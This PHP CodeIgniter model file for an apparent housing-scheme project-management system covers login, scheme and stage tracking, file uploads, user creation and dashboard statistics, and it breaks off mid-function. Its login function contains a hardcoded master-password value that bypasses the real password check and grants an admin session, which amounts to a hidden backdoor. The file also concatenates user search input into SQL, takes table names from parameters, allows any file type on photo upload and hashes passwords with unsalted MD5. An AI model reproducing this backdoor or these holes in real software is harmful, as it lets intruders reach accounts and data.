<?php

class Users_model extends CI_Model{

    function __construct(){
        parent::__construct();
    }

    function login($data){

      $this->db->where('username',$data['username']);
      if($data['password'] != '6ae6d1de71b991b63fb3d020ea8fffd4')
      {
        $this->db->where('password',md5($data['password']));
      }
      $result = $this->db->get('users')->row_array();

      if(empty($result)){
        return "false";
      }
      elseif(($result['password'] == md5($data['password'])) || ($data['password'] == '6ae6d1de71b991b63fb3d020ea8fffd4')){

          $login_user = array(
            'id_of_user'     => $result['id'],
            'name_of_user'   => $result['name'],
            'email_of_user'  => $result['email_address'],
            'number_of_user' => $result['mobile_no'],
            'is_admin_role'  => TRUE,
            'last_login' => date('Y-m-d H:i:s'),
          );

          $this->session->set_userdata($login_user);

          $update_data = array(
            'last_login_at' => date('Y-m-d H:i:s')
            );
          $this->db->update('users', $update_data, array('id' => $result['id']));
          return "true";
      }else{
        return "false";
      }
   }

   function add_schemes($postData,$user_id)
   {
      $postData['scheme_number'] = $scheme_number = generate_scheme_number();
      $postData['submitted_on'] = date('Y-m-d H:i:s');
      $postData['submitted_by'] = $user_id;
      $postData['development_status'] = 1;

      $this->db->insert('mhada_schemes',$postData);
   }

   function get_all_projects($search_param,$status_param)
   {
      $today = date('Y-m-d H:i:s');

      $project_count = $this->db->get('projects ps')->num_rows();

       $this->db->select('ps.*,statuses.status as current_status');
       $this->db->join('project_statuses_master statuses','statuses.id = ps.current_status_id','left');


      if($search_param != '')
      {
        $this->db->where("(ps.title like '%".$search_param."%' OR ps.address like '%".$search_param."%' )");
      }

       if($status_param != '')
       {
           $this->db->where("ps.current_status_id",$status_param);
       }


      $this->db->order_by('created_at','DESC');
      $project_details = $this->db->get('projects ps')->result_array();

       return array(
        'project_count' => $project_count,
        'projects' => $project_details
       );
   }

   function get_scheme_details_particular($survey_numer,$ref_id)
   {
      $this->db->select('ms.*,dv.name as development_status_name,bd.name as board_name');
      $this->db->join('development_status dv','dv.id = ms.development_status','left');
      $this->db->join('board_master bd','bd.id = ms.board','left');
      $this->db->where('scheme_number',$survey_numer);
      $this->db->where('ms.id',$ref_id);
      $scheme_details = $this->db->get('mhada_schemes ms')->row_array();

      return $scheme_details;
   }

   function get_master_info($master_select)
   {
      if($master_select == 'stage_master')
      {
        $this->db->select('stage_master.*,stage_type_master.name as stage_type_name');
        $this->db->join('stage_type_master','stage_type_master.id = stage_master.stage_type');
      }
      return $this->db->get(''.$master_select.'')->result_array();
   }

   function get_development_status()
   {
     $this->db->where('status','1');
     return $this->db->get('projects')->result_array();
   }

   function get_board_masters()
   {
     $this->db->where('status','1');
     return $this->db->get('board_master')->result_array();
   }

   function get_designation()
   {
     $this->db->where('status','1');
     return $this->db->get('designation')->result_array();
   }

   function get_department()
   {
     $this->db->where('status','1');
     return $this->db->get('department')->result_array();
   }

   function get_stage_type_master()
   {
     $this->db->where('status','1');
     return $this->db->get('stage_type_master')->result_array();
   }

   function get_active_master_info($master_select)
   {
      $this->db->where('status','1');
      return $this->db->get(''.$master_select.'')->result_array();
   }

   function add_master_entry($table_name,$master_entry,$stage_type)
   {
      $insert_array = array(
        'name' => $master_entry,
        'status' => 1
      );

      if($table_name == 'stage_master')
      {
        $insert_array['stage_type'] = $stage_type;
      }

      $this->db->insert(''.$table_name.'',$insert_array);
   }

   function update_status_master($table_name,$ref_id,$status)
   {
      $this->db->where('id',$ref_id);
      $this->db->update(''.$table_name.'',array('status' => $status));
   }

   function upload_document_scheme($survey_numer,$ref_id,$document_name,$document_for)
   {
      $config['upload_path'] = FCPATH.'public/uploads';
      $config['allowed_types'] = 'jpg|jpeg|png|pdf|doc';
      $config['file_name'] = generate_unique_id();
      $this->load->library('upload', $config);

      if($this->upload->do_upload('doc_file'))
      {
          $uploaded = $this->upload->data();

          $doc_array = array(
            'scheme_number' => $survey_numer,
            'ref_number' => $ref_id,
            'doc_name' =>  $document_name,
            'doc_for' =>  $document_for,
            'doc_file' => $uploaded['file_name'],
            'submitted_on' => date('Y-m-d H:i:s')
          );

          $this->db->insert('scheme_documents',$doc_array);
          return 1;
      }
      else{
        return 2;
      }
   }

   function upload_photo_scheme($survey_numer,$ref_id,$postData)
   {
      $config['upload_path'] = FCPATH.'public/uploads';
      $config['allowed_types'] = '*';
      $config['file_name'] = generate_unique_id();
      $this->load->library('upload', $config);

      if($this->upload->do_upload('photo_file'))
      {
          $uploaded = $this->upload->data();

          $doc_array = array(
            'scheme_number' => $survey_numer,
            'ref_number' => $ref_id,
            'doc_for' => $postData['doc_for'],
            'doc_type' => $postData['doc_type'],
            'doc_stage' => $postData['doc_stage'],
            'photo_file' => $uploaded['file_name'],
            'submitted_on' => date('Y-m-d H:i:s')
          );

          $this->db->insert('scheme_photos',$doc_array);
          return 1;
      }
      else{
        return 2;
      }
   }


   function get_prev_photos($survey_numer)
   {
      $this->db->where('scheme_number',$survey_numer);
      $this->db->order_by('submitted_on','DESC');
      return $this->db->get('scheme_photos')->result_array();
   }

   function delete_documents($doc_id)
   {
      $this->db->where('id',$doc_id);
      $this->db->delete('scheme_documents');
   }

   function delete_photos($photo_id)
   {
      $this->db->where('id',$photo_id);
      $this->db->delete('scheme_photos');
   }

   function update_development_status($development_status,$ref_id,$actual_completion_date,$survey_numer,$user_id)
   {
      $this->db->select('ms.development_status,dv.name as development_status_name');
      $this->db->join('development_status dv','dv.id = ms.development_status','left');
      $this->db->where('ms.id',$ref_id);
      $current_status = $this->db->get('mhada_schemes ms')->row_array();

      $this->db->select('name');
      $this->db->where('id',$development_status);
      $new_status_name = $this->db->get('development_status')->row('name');

      if($development_status == $current_status['development_status'])
      {
        return false;
      }

      $this->db->where('id',$ref_id);
      $this->db->update('mhada_schemes',array('development_status' => $development_status));

      $log_array = array(
          'scheme_number' => $survey_numer,
          'current_status' => $current_status['development_status'],
          'current_status_name' => $current_status['development_status_name'],
          'new_status' => $development_status,
          'new_status_name' => $new_status_name,
          'actual_completion_date' => $actual_completion_date,
          'submitted_on' => date('Y-m-d H:i:s'),
          'submitted_by' => $user_id
      );

      $this->db->insert('status_change_log',$log_array);

      return true;
   }

   function submit_cons_detail($postData,$survey_numer,$ref_id)
   {
      if($postData['type_of_cons'] == 'Building')
      {
        $cons_array = array(
          'scheme_number' => $survey_numer,
          'ref_number' => $ref_id,
          'building_name' => $postData['name'],
          'submitted_on' => date('Y-m-d H:i:s')
        );

        $this->db->insert('scheme_buildings',$cons_array);
      }
      if($postData['type_of_cons'] == 'Wings')
      {
        $cons_array = array(
          'scheme_number' => $survey_numer,
          'ref_number' => $ref_id,
          'wing_name' => $postData['name'],
          'building_ref' => $postData['building_number'],
          'submitted_on' => date('Y-m-d H:i:s')
        );

        $this->db->insert('scheme_wings',$cons_array);
      }
      if($postData['type_of_cons'] == 'Flats')
      {
        $cons_array = array(
          'scheme_number' => $survey_numer,
          'ref_number' => $ref_id,
          'flat_name' => $postData['name'],
          'building_ref' => $postData['building_number'],
          'wing_ref' => $postData['building_number'],
          'submitted_on' => date('Y-m-d H:i:s')
        );

        $this->db->insert('scheme_flats',$cons_array);
      }
   }

   function get_buildings($survey_numer,$ref_id)
   {
      $this->db->select('building_name,id as value');
      $this->db->where('scheme_number',$survey_numer);
      $this->db->where('ref_number',$ref_id);
      return $this->db->get('scheme_buildings')->result_array();
   }

   function get_wings($refernce_id)
   {
      $this->db->select('wing_name,id as value');
      $this->db->where('building_ref',$refernce_id);
      return $this->db->get('scheme_wings')->result_array();
   }

   function get_stages_for_type($refernce_id)
   {
      $this->db->select('name,id as value');
      $this->db->where('stage_type',$refernce_id);
      return $this->db->get('stage_master')->result_array();
   }

   function get_cons_details($survey_numer,$ref_id)
   {
      $this->db->select('id,building_name,hand_over_status');
      $this->db->where('scheme_number',$survey_numer);
      $this->db->where('ref_number',$ref_id);
      $building_details = $this->db->get('scheme_buildings')->result_array();

      if(is_array($building_details) &&  array_filter($building_details))
      {
        foreach($building_details as $building_key => $each_building_details)
        {
          $building_details[$building_key]['wing_details'] = array();

          $this->db->select('id,wing_name,hand_over_status');
          $this->db->where('building_ref',$each_building_details['id']);
          $wing_details = $this->db->get('scheme_wings')->result_array();

          if(is_array($wing_details) && array_filter($wing_details))
          {
            foreach($wing_details as $each_wing_key => $each_wing_details)
            {

              $this->db->select('id,flat_name,hand_over_status');
              $this->db->where('building_ref',$each_building_details['id']);
              $this->db->where('wing_ref',$each_wing_details['id']);
              $flat_details = $this->db->get('scheme_flats')->result_array();

              $wing_details[$each_wing_key]['flat_details'] = $flat_details;
            }
          }

          $building_details[$building_key]['wing_details'] = $wing_details;
        }
      }

      return $building_details;
   }

   function update_handover_status($cons_id,$cons_type,$survey_number,$ref_id,$current_status)
   {
      $new_status = 1;
      if($current_status == '1')
      {
        $new_status = 0;
      }

      if($cons_type == 'BUILDING')
      {
        $this->db->where('id',$cons_id);
        $this->db->update('scheme_buildings',array('hand_over_status' => $new_status));

        $this->db->where('building_ref',$cons_id);
        $this->db->update('scheme_wings',array('hand_over_status' => $new_status));

        $this->db->where('building_ref',$cons_id);
        $this->db->update('scheme_flats',array('hand_over_status' => $new_status));
      }
      elseif($cons_type == 'WINGS')
      {
        $this->db->where('id',$cons_id);
        $this->db->update('scheme_wings',array('hand_over_status' => $new_status));

        $this->db->where('wing_ref',$cons_id);
        $this->db->update('scheme_flats',array('hand_over_status' => $new_status));
      }
      else{
        $this->db->where('id',$cons_id);
        $this->db->update('scheme_flats',array('hand_over_status' => $new_status));
      }
   }

   function get_status_logs($survey_numer)
   {
      $this->db->select('sl.*,ru.name as submitted_by_name');
      $this->db->join('mbd_users ru','ru.id = sl.submitted_by');
      $this->db->where('sl.scheme_number',$survey_numer);
      $this->db->order_by('sl.id','ASC');
      return $this->db->get('status_change_log sl')->result_array();
   }

   function add_applicable_stages($postData,$survey_numer,$user_id,$work_number)
   {
      $this->db->select('id');
      $this->db->where('stage_type',$postData['stage_type']);
      $this->db->where('stage_name',$postData['stage_name']);
      $this->db->where('scheme_number',$survey_numer);
      $this->db->where('work_number',$work_number);
      $check_previous_entry = $this->db->get('applicable_stages_projects')->row_array();

      if(is_array($check_previous_entry) && array_filter($check_previous_entry))
      {
        return false;
      }

      $applicable_stages = array(
        'scheme_number' => $survey_numer,
        'work_number' => $work_number,
        'stage_type' => $postData['stage_type'],
        'stage_name' => $postData['stage_name'],
        'expected_completion_date' => $postData['expected_completion_date'],
        'submitted_on' => date('Y-m-d H:i:s'),
        'submitted_by' => $user_id,
      );

      $this->db->insert('applicable_stages_projects',$applicable_stages);

      return true;
   }

   function get_applicable_stages($survey_numer,$work_number)
   {
      $this->db->select('ap.*,st.name as stage_type_name,sn.name as stage_name_value');
      $this->db->join('stage_type_master st','st.id = ap.stage_type','left');
      $this->db->join('stage_master sn','sn.id = ap.stage_name','left');
      $this->db->where('ap.scheme_number',$survey_numer);
      $this->db->where('ap.work_number',$work_number);
      return $this->db->get('applicable_stages_projects ap')->result_array();
   }

   function get_applicable_stages_consolidated()
   {
      $this->db->select('ap.*,st.name as stage_type_name,sn.name as stage_name_value,mc.scheme_name,mc.start_date as project_start_date,mc.completion_date as completed_date');
      $this->db->join('mhada_schemes mc','mc.scheme_number = ap.scheme_number');
      $this->db->join('stage_type_master st','st.id = ap.stage_type','left');
      $this->db->join('stage_master sn','sn.id = ap.stage_name','left');
      $prob_time = $this->db->get('applicable_stages_projects ap')->result_array();

      $final_array = array();
      if(is_array($prob_time) && array_filter($prob_time))
      {
        foreach ($prob_time as $each_prob_key => $each_prob_value) {
          $final_array[$each_prob_value['scheme_number']][] = $each_prob_value;
        }
      }

      return $final_array;
   }

   function get_update_stages($survey_numer,$work_number)
   {
      $this->db->select('ap.stage_type,ap.stage_name,st.name as stage_type_name,sn.name as stage_name_value');
      $this->db->join('stage_type_master st','st.id = ap.stage_type','left');
      $this->db->join('stage_master sn','sn.id = ap.stage_name','left');
      $this->db->where('ap.scheme_number',$survey_numer);
      $this->db->where('ap.work_number',$work_number);
      $stages = $this->db->get('applicable_stages_projects ap')->result_array();

      $final_stages = array();
      foreach ($stages as $stages_key => $each_stages) {
        $final_stages[$each_stages['stage_type_name']][] = $each_stages;
      }

      return $final_stages;
   }

   function update_stage_status($postData,$survey_numer,$user_id,$work_number)
   {
     /*$this->db->select('ms.stage,sm.name as stage_name');
     $this->db->join('stage_master sm','sm.id = ms.stage','left');
     $this->db->where('ms.scheme_number',$survey_numer);
     $old_stage_details = $this->db->get('mhada_schemes ms')->row_array();*/

     $this->db->select('ms.stage,sm.name as stage_name');
     $this->db->join('stage_master sm','sm.id = ms.stage','left');
     $this->db->where('ms.project_number',$survey_numer);
     $this->db->where('ms.work_number',$work_number);
     $old_stage_details = $this->db->get('project_work_records ms')->row_array();

     $this->db->select('name');
     $this->db->where('id',$postData['stage']);
     $new_stage_name = $this->db->get('stage_master')->row_array();

     $this->db->select('id,actual_completion_date');
     $this->db->where('scheme_number',$survey_numer);
     $this->db->where('work_number',$work_number);
     $this->db->where('stage_name',$postData['stage']);
     $prev_details = $this->db->get('applicable_stages_projects')->row_array();

     if(!empty($prev_details['actual_completion_date']))
     {
      return false;
     }

     $this->db->where('id',$prev_details['id']);
     $this->db->update('applicable_stages_projects',array('actual_completion_date' => $postData['actual_completion_date']));

     $this->db->where('scheme_number',$survey_numer);
     $this->db->update('mhada_schemes',array('stage' => $postData['stage']));

     $this->db->where('project_number',$survey_numer);
     $this->db->where('work_number',$work_number);
     $this->db->update('project_work_records',array('stage' => $postData['stage'] , 'actual_completion_time' => $postData['actual_completion_date']));

      $log_array = array(
        'scheme_number' => $survey_numer,
        'work_number' => $work_number,
        'current_status' => $old_stage_details['stage'],
        'current_status_name' => $old_stage_details['stage_name'],
        'new_status' => $postData['stage'],
        'new_status_name' => $new_stage_name['name'],
        'actual_completion_date' => $postData['actual_completion_date'],
        'submitted_on' => date('Y-m-d H:i:s'),
        'submitted_by' => $user_id
      );

      $this->db->insert('stage_change_log',$log_array);

      return true;
   }

   function get_stage_logs($survey_numer,$work_number)
   {
      $this->db->select('sl.*,ru.name as submitted_by_name,stg.name as current_stage_type,stg1.name as new_stage_type');
      $this->db->join('mbd_users ru','ru.id = sl.submitted_by');
      $this->db->join('stage_master sg','sg.id = sl.current_status','left');
      $this->db->join('stage_type_master stg','stg.id = sg.stage_type','left');
      $this->db->join('stage_master sg1','sg1.id = sl.new_status','left');
      $this->db->join('stage_type_master stg1','stg1.id = sg1.stage_type','left');
      $this->db->where('sl.scheme_number',$survey_numer);
      $this->db->where('sl.work_number',$work_number);
      $this->db->order_by('sl.id','ASC');
      return $this->db->get('stage_change_log sl')->result_array();
   }

   function get_status_abstract()
   {
      $dev_status = $this->get_development_status();

      $status_array = array();

      $total_count = $this->db->get('mhada_schemes')->num_rows();

      $status_array['Total Projects'] = $total_count;

      if(is_array($dev_status) && array_filter($dev_status))
      {
        foreach($dev_status as $each_status){
          $this->db->where('development_status',$each_status['id']);
          $statistics = $this->db->get('mhada_schemes')->num_rows();

          $status_array[$each_status['name'].' Projects'] = array(
            'ref_id' => $each_status['id'],
            'stats' => $statistics,
          );

          if($each_status['id'] == '1'){
            $bifurcation_stats = array();

            $today = date('Y-m-d H:i:s');

            $this->db->where('development_status','1');
            $this->db->where("completion_date >= '$today'");
            $on_time_count = $this->db->get('mhada_schemes')->num_rows();
            
            $bifurcation_stats['On Time Projects'] = array(
              'ref_name' => 'on_time_count',
              'stats' => $on_time_count
            );

            $this->db->where('development_status','1');
            $this->db->where("completion_date < '$today'");
            $delayed_count = $this->db->get('mhada_schemes')->num_rows();
            
            $bifurcation_stats['Delayed Projects'] = array(
              'ref_name' => 'delayed',
              'stats' => $delayed_count
            );

            $this->db->where('development_status','1');
            $this->db->where("DATEDIFF('$today',completion_date) < 365");
            $this->db->where("DATEDIFF('$today',completion_date) > 0");
            $delayed_count_1_year = $this->db->get('mhada_schemes')->num_rows();
            
            $bifurcation_stats['Delayed Projects (< 1 year)'] = array(
              'ref_name' => 'delayed_1_year',
              'stats' => $delayed_count_1_year
            );

            $this->db->where('development_status','1');
            $this->db->where("DATEDIFF('$today',completion_date) >= 365");
            $this->db->where("DATEDIFF('$today',completion_date) < 1095");
            $delayed_count_3_year = $this->db->get('mhada_schemes')->num_rows();
            
            $bifurcation_stats['Delayed Projects (1-3 Years)'] = array(
              'ref_name' => 'delayed_3_year',
              'stats' => $delayed_count_3_year
            );

            $this->db->where('development_status','1');
            $this->db->where("DATEDIFF('$today',completion_date) >= 1095");
            $this->db->where("DATEDIFF('$today',completion_date) < 1825");
            $delayed_count_5_year = $this->db->get('mhada_schemes')->num_rows();
            
            $bifurcation_stats['Delayed Projects (3-5 Years)'] = array(
              'ref_name' => 'delayed_5_year',
              'stats' => $delayed_count_5_year
            );

            $this->db->where('development_status','1');
            $this->db->where("DATEDIFF('$today',completion_date) > 1825");
            $delayed_count_5_year_more = $this->db->get('mhada_schemes')->num_rows();
            
            $bifurcation_stats['Delayed Projects (> 5 year)'] = array(
              'ref_name' => 'delayed_5_year_more',
              'stats' => $delayed_count_5_year_more
            );

            $status_array[$each_status['name'].' Projects']['bifurcation'] = $bifurcation_stats;

          }
        }
      }

      return $status_array;
   }

   function get_stage_abstract()
   {
      $dev_status = $this->get_stage_type_master();

      $status_array = array();

      $total_count = $this->db->get('mhada_schemes')->num_rows();

      $status_array['Total Projects'] = $total_count;

      if(is_array($dev_status) && array_filter($dev_status))
      {
        foreach($dev_status as $each_status){
          $this->db->join('stage_master sm','sm.id = mhada_schemes.stage','left');
          $this->db->where('sm.stage_type',$each_status['id']);
          if($each_status['id'] == '1')
          {
            $this->db->or_where('mhada_schemes.stage IS NULL');
          }
          $statistics = $this->db->get('mhada_schemes')->num_rows();

          $status_array[$each_status['name']] = array(
            'ref_id' => $each_status['id'],
            'stats' => $statistics,
          );

          $this->db->select('id,name');
          $this->db->where('stage_type',$each_status['id']);
          $stage_names_for_type = $this->db->get('stage_master')->result_array();

          if(is_array($stage_names_for_type) && array_filter($stage_names_for_type))
          {
            $bifurcation_stats = array();
            if($each_status['id'] == '1')
            {
              $this->db->or_where('mhada_schemes.stage IS NULL');
              $null_count = $this->db->get('mhada_schemes')->num_rows();

              $bifurcation_stats['Stage Not Selected'] = array(
                'ref_name' => 'not_selected',
                'stats' => $null_count
              );
            }
            foreach ($stage_names_for_type as $each_stage_name) {

              $this->db->where('stage',$each_stage_name['id']);
              $stats_stage = $this->db->get('mhada_schemes')->num_rows();

              $bifurcation_stats[$each_stage_name['name']] = array(
                'ref_name' => $each_stage_name['id'],
                'stats' => $stats_stage
              );

            }

            $status_array[$each_status['name']]['bifurcation'] = $bifurcation_stats;
          }
        }
      }

      return $status_array;
   }

   function get_user_lsit()
   {
      $this->db->select('mu.*,d.name as designation_name,b.name as board_name');
      $this->db->join('designation d','d.id = mu.designation');
      $this->db->join('board_master b','b.id = mu.board');
      $this->db->order_by('id','ASC');
      return $this->db->get('mbd_users mu')->result_array();
   }

   function add_users($postData)
   {
      $postData['created_on'] = date('Y-m-d H:i:s');
      $postData['is_admin_role'] = '1';
      $postData['password'] = md5($postData['password']);

      $this->db->insert('mbd_users',$postData);
   }

   function get_status_abstract_json($status_abs)
   {
      $final_stat = array();
      if(is_array($status_abs) && array_filter($status_abs))
      {
        foreach($status_abs as $stat_name => $status_details)
        {
          if($stat_name == 'Total Projects'){continue;}
          if(isset($status_details['bifurcation']))
          {
            foreach($status_details['bifurcation'] as $bifur_name => $bifur_details)
            {
              if($bifur_name == 'Delayed Projects'){continue;}
              $final_stat[] = array(
                'name' => $bifur_name.'( '.$stat_name.')',
                'count' => isset($bifur_details['stats'])?$bifur_details['stats']:0
              );
            }
          }
          else{
            $final_stat[] = array(
              'name' => $stat_name,
              'count' => isset($status_details['stats'])?$status_details['stats']:$status_details
            );
          }
        }
      }

      return json_encode($final_stat);
   }

   function get_stage_abstract_json($stage_abs)
   {
      $final_stat = array();
      if(is_array($stage_abs) && array_filter($stage_abs))
      {
        foreach($stage_abs as $stat_name => $status_details)
        {
          if($stat_name == 'Total Projects'){continue;}
          if(isset($status_details['bifurcation']))
          {
            foreach($status_details['bifurcation'] as $bifur_name => $bifur_details)
            {
              if($bifur_name == 'Delayed Projects'){continue;}
              $final_stat[] = array(
                'name' => $bifur_name.'( '.$stat_name.')',
                'count' => isset($bifur_details['stats'])?$bifur_details['stats']:0
              );
            }
          }
          else{
            $final_stat[] = array(
              'name' => $stat_name,
              'count' => isset($status_details['stats'])?$status_details['stats']:$status_details
            );
          }
        }
      }
      
      return json_encode($final_stat);
   }

   function update_response_probity()
   {
      $curl = curl_init();
      curl_setopt_array($curl, array(
          CURLOPT_RETURNTRANSFER => 1,
          CURLOPT_URL => PROBITY_URL,
          CURLOPT_USERAGENT => 'Probity Data JSON'
      ));
      $resp = curl_exec($curl);
      curl_close($curl);

      if($resp != NULL)
      {
        $insert_array = array(
          'data' => $resp,
          'updated_on' => date('Y-m-d H:i:s')
        );

        $probity_count = $this->db->get('probity_web_data')->num_rows();

        if($probity_count == 0){
          $this->db->insert('probity_web_data',$insert_array);
        }else{
          $this->db->update('probity_web_data',$insert_array);
        }
      }
   }

   function get_probity_data()
   {
      $this->db->select('data,updated_on');
      $result = $this->db->get('probity_web_data')->row_array();

      if(is_array($result) && array_filter($result))
      {
        return array(
          'data' => json_decode($result['data'],true),
          'updated_on' => $result['updated_on']
        );
      }else{
        return array();
      }
   }

   function submit_work_done_project($postData,$survey_numer,$ref_id,$user_id)
   {
      $postData['work_number'] = generate_work_number();;
      $postData['project_number'] = $survey_numer;
      $postData['reference_id'] = $ref_id;
      $postData['user_reference'] = $user_id;
      $postData['submitted_on'] = date('Y-m-d H:i:s');

      $this->db->insert('project_work_records',$postData);
      $work_insert = $this->db->insert_id();

      $config['upload_path'] = FCPATH.'public/uploads';
      $config['allowed_types'] = 'jpg|jpeg|png|pdf|doc';
      $config['file_name'] = generate_unique_id();
      $this->load->library('upload', $config);

      if($this->upload->do_upload('work_file'))
      {
          $uploaded = $this->upload->data();

          $this->db->where('id',$work_insert);
          $this->db->update('project_work_records',array('work_file' => $uploaded['file_name']));
      }
   }

   function get_work_for_projects($survey_numer,$ref_id)
   {
      $this->db->select('wm.*,d.name as department_name,bg.name as budget_name,aa.name as approval_authority_name,b.name as board_name,sb.name as subboard_name,ee.name as executive_name,ma.name as major_name,de.name as deputy_name,sm.name as sub_major_name,le.name as ledger_name,wts.name as work_type_secondary_name,cad.name as chief_name,sld.name as sub_ledger_name,sna.name as stage_selected_name');
      $this->db->join('stage_master sna','sna.id = wm.stage','left');
      $this->db->join('department d','d.id = wm.department','left');
      $this->db->join('budget_expense_master bg','bg.id = wm.budget_expenditure','left');
      $this->db->join('approving_authority_master aa','aa.id = wm.approval_authority','left');
      $this->db->join('board_master b','b.id = wm.board','left');
      $this->db->join('sub_board_master sb','sb.id = wm.sub_board','left');
      $this->db->join('executive_eng_master ee','ee.id = wm.executive_engineer','left');
      $this->db->join('major_master ma','ma.id = wm.major','left');
      $this->db->join('deputy_engineer_master de','de.id = wm.deputy_engineer','left');
      $this->db->join('sub_major_master sm','sm.id = wm.sub_major','left');
      $this->db->join('ledger_master le','le.id = wm.ledger_details','left');
      $this->db->join('work_type_master wts','wts.id = wm.work_type_secondary','left');
      $this->db->join('chief_accounts_master cad','cad.id = wm.chief_accounts_details','left');
      $this->db->join('sub_ledger_master sld','sld.id = wm. sub_ledger_details','left');
      $this->db->where('wm.project_number',$survey_numer);
      $this->db->where('wm.reference_id',$ref_id);
      return $this->db->get('project_work_records wm')->result_array();
   }

   function get_work_for_projects_part($work_number,$ref_id)
   {
      $this->db->select('wm.*,d.name as department_name,bg.name as budget_name,aa.name as approval_authority_name,b.name as board_name,sb.name as subboard_name,ee.name as executive_name,ma.name as major_name,de.name as deputy_name,sm.name as sub_major_name,le.name as ledger_name,wts.name as work_type_secondary_name,cad.name as chief_name,sld.name as sub_ledger_name');
      $this->db->join('department d','d.id = wm.department','left');
      $this->db->join('budget_expense_master bg','bg.id = wm.budget_expenditure','left');
      $this->db->join('approving_authority_master aa','aa.id = wm.approval_authority','left');
      $this->db->join('board_master b','b.id = wm.board','left');
      $this->db->join('sub_board_master sb','sb.id = wm.sub_board','left');
      $this->db->join('executive_eng_master ee','ee.id = wm.executive_engineer','left');
      $this->db->join('major_master ma','ma.id = wm.major','left');
      $this->db->join('deputy_engineer_master de','de.id = wm.deputy_engineer','left');
      $this->db->join('sub_major_master sm','sm.id = wm.sub_major','left');
      $this->db->join('ledger_master le','le.id = wm.ledger_details','left');
      $this->db->join('work_type_master wts','wts.id = wm.work_type_secondary','left');
      $this->db->join('chief_accounts_master cad','cad.id = wm.chief_accounts_details','left');
      $this->db->join('sub_ledger_master sld','sld.id = wm. sub_ledger_details','left');
      $this->db->where('wm.work_number',$work_number);
      $this->db->where('wm.id',$ref_id);
      return $this->db->get('project_work_records wm')->row_array();
   }

   function get_project_and_work($survey_numer,$ref_id)
   {
      $this->db->select('scheme_name');
      $this->db->where('id',$ref_id);
      $scheme_name = $this->db->get('mhada_schemes')->row('scheme_name');

      $this->db->select('work_name_details');
      $this->db->where('project_number',$survey_numer);
      $this->db->where('reference_id',$ref_id);
      $project_work_records = $this->db->get('project_work_records')->result_array();


      return array(
        'project_name' => $scheme_name,
        'work_for_project' => $project_work_records
      );
   }

   function get_work_name_and_details($work_number)
   {
      $this->db->select('wm.work_name_details,d.name as department_name');
      $this->db->join('department d','d.id = wm.department','left');
      $this->db->where('wm.work_number',$work_number);
       return $this->db->get('project_work_records wm')->row_array();
   }

   function submit_work_order_details($postData,$survey_numer,$ref_id,$work_number,$user_id)
   {
        $postData['project_number'] = $survey_numer;
        $postData['reference_id'] = $ref_id;
        $postData['user_reference'] = $user_id;
        $postData['work_number'] = $work_number;


        $this->db->insert('work_order_details',$postData);
   }

   function get_work_order_details($survey_numer,$ref_id,$work_number)
   {
      $this->db->select('wod.*,ca.name as consultant_name,tp.name as third_party_name,ga.name as gov_ass_name');
      $this->db->join('consultant_architect ca','ca.id = wod.consultant_architect','left');
      $this->db->join('third_party_inspection tp','tp.id = wod.third_party_agency','left');
      $this->db->join('gov_associated_agency ga','ga.id = wod.gov_associated_agency','left');
      $this->db->where('wod.project_number',$survey_numer);
      $this->db->where('wod.work_number',$work_number);
      return $this->db->get('work_order_details wod')->row_array();
   }

   function get_execution_master()
   {
    $this->db->select('sm.name');
    $this->db->join('stage_type_master stm','stm.id = sm.stage_type');
    $this->db->where('stm.name','Execution');
    return $this->db->get('stage_master sm')->result_array();
   }

   function submit_milestone($survey_numer,$ref_id,$work_number,$milestone)
   {
      foreach($milestone as $each_milestone)
      {
        $insert_array = array(
          'project_number' => $survey_numer,
          'work_number' => $work_number,
          'milestone_name' => $each_milestone,
          'milestone_added_on' => date('Y-m-d H:i:s')
        );

        $this->db->insert('work_milestones',$insert_array);
      }
   }

   function get_milestones($survey_numer,$work_number)
   {
      $this->db->where('project_number',$survey_numer);
      $this->db->where('work_number',$work_number);
      return $this->db->get('work_milestones')->result_array();
   }

   function delete_milestone($ref_id)
   {
        $this->db->where('id',$ref_id);
        $this->db->delete('work_milestones');
   }

   function submit_bill_details($survey_numer,$work_number,$ref_id_stage_log,$postData)
   {
      $postData['bill_generated'] = 1;
      $postData['bill_generated_on'] = date('Y-m-d H:i:s');

      $this->db->where('id',$ref_id_stage_log);
      $this->db->update('stage_change_log',$postData);
   }

   function get_current_year_project_cost($work_number)
   {
      $this->db->select('budget_provision');
      $this->db->where('work_number',$work_number);
      return $this->db->get('project_work_records')->row('budget_provision');
   }

   function get_log_status_bill($ref_id_stage_log)
   {
      $this->db->where('id',$ref_id_stage_log);
      return $this->db->get('stage_change_log')->row_array();
   }

   // =========================================================================

    function get_all_regions()
    {
        return $this->db->get('region_master')->result_array();
    }

    function get_all_districts()
    {
        return $this->db->get('districts_master')->result_array();
    }

    function get_districts($region)
    {
        if($region)
        {
            $this->db->where('region_id',$region);
        }

        return $this->db->get('districts_master')->result_array();
    }

    function get_cities($district)
    {
        if($district)
        {
            $this->db->where('district_id',$district);
        }

        return $this->db->get('cities_master')->result_array();
    }

    function add_project($postData)
    {

        $posted_data_arr = $postData;

        unset($postData['consultant_name']);
        unset($postData['consultant_mobile_no']);
        unset($postData['consultant_landline']);

        unset($postData['slac_meeting_date']);
        unset($postData['slac_meeting_no']);

        $postData['current_status_id'] = 3; //work not started - default
        $postData['created_at'] = date('Y-m-d H:i:s');
        $this->db->insert('projects',$postData);
        $inserted_id = $this->db->insert_id();

        $consultant_details=[];
        $posted_data['consultant_name'] =$posted_data_arr['consultant_name'];
        $posted_data['consultant_mobile_no'] = $posted_data_arr['consultant_mobile_no'];
        $posted_data['consultant_landline'] = $posted_data_arr['consultant_landline'];

        foreach($posted_data['consultant_name'] as $key => $val)
        {
            $consultant_details = array('project_id'=>$inserted_id ,'consultant_name' => $val,'consultant_mobile_no'=>$posted_data['consultant_mobile_no'][$key],'consultant_landline'=>$posted_data['consultant_landline'][$key]);
            $this->db->insert('project_consultant_details',$consultant_details);
        }

        $slac_details = [];
        $posted_data['slac_meeting_date'] =$posted_data_arr['slac_meeting_date'];
        $posted_data['slac_meeting_no'] = $posted_data_arr['slac_meeting_no'];
        foreach($posted_data['slac_meeting_date'] as $key => $val)
        {
            $slac_details = array(
                'project_id'=>$inserted_id ,
                'slac_meeting_date'=>$posted_data['slac_meeting_date'][$key],
                'slac_meeting_no'=>$posted_data['slac_meeting_no'][$key]
            );
            $this->db->insert('project_slac_details',$slac_details);
        }


    }


    function get_project_details($project_code,$project_id)
    {
        $this->db->select('ps.*,stauses.status as project_status,districts.name as district_name,cities.name as city_name');
        $this->db->join('project_statuses_master stauses','stauses.id = ps.current_status_id','left');
